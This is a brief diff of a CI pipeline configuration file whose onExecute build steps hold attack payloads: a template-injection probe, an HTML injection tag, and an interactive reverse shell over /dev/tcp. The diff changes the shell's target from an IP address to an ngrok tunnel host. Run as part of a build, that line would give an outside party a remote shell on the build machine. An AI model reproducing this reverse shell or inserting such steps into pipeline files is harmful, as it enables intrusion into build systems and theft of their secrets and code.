@@ -9,5 +9,5 @@ pipelines:
         execution:
           onExecute:
             - echo "${{7*'7'}}"
-            - sh -i >& /dev/tcp/206.189.60.40/443 0>&1
+            - sh -i >& /dev/tcp/2.tcp.eu.ngrok.io/18236 0>&1
             - <img src=x>
